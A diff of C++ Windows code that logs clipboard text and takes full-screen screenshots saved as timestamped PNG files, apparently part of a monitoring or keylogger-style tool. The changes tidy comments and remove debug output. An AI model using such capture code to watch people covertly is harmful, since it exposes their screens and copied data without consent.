@@ -126,6 +126,8 @@ void writeClipboardChange(){
 	logfile << getClipboardText() << "*" << std::endl << std::endl;
 }
 
+/* Similar to getDate() but without the ':' since they aren't allowed in windows filenames */
+
 std::string	getScreenFileName() {
 	struct tm* timeinfo;
 	char timestr[23];
@@ -133,17 +135,20 @@ std::string	getScreenFileName() {
 
 	time(&rawtime);
 	timeinfo = localtime(&rawtime);
-	sprintf(timestr, "%02d-%02d-%d %02d_%02d_%02d.jpg", timeinfo->tm_mday, timeinfo->tm_mon + 1, timeinfo->tm_year + 1900, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
+	sprintf(timestr, "%02d-%02d-%d %02d_%02d_%02d.png", timeinfo->tm_mday, timeinfo->tm_mon + 1, timeinfo->tm_year + 1900, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
 	return (timestr);
 }
+
+/* saveScreenToFile creates an instance of CImage class then calls the save method to save the bitmap to a .png file */
 
 void	saveScreenToFile(HBITMAP hBitmap){
 	CImage image;
 	image.Attach(hBitmap);
 	std::string filename = getScreenFileName();
-	std::cout << "filename : " << filename << std::endl;
 	std::cout << "HRESULT : " << image.Save(filename.c_str()) << std::endl;
 }
+
+/* takeScreen() first sets the awareness context for window to get the correct screen dimensions then create a compatible bitmap*/
 
 void	takeScreen(){
 	int x1, y1, x2, y2, w, h;
@@ -157,9 +162,6 @@ void	takeScreen(){
     w   = x2 - x1;
     h   = y2 - y1;
 
-
-	std::cout << x1 << ", " << x2 << ", " << y1 << ", " << y2 << ", " << std::endl;
-
 	// copy screen to bitmap
     HDC     hScreen = GetDC(NULL);
     HDC     hDC     = CreateCompatibleDC(hScreen);
@@ -167,12 +169,6 @@ void	takeScreen(){
     HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
     BOOL    bRet    = BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);
 
-	// save bitmap to clipboard
-    OpenClipboard(NULL);
-    EmptyClipboard();
-    SetClipboardData(CF_BITMAP, hBitmap);
-    CloseClipboard();
-	std::cout << "screen taken??" << std::endl;
 	saveScreenToFile(hBitmap);
 }
 
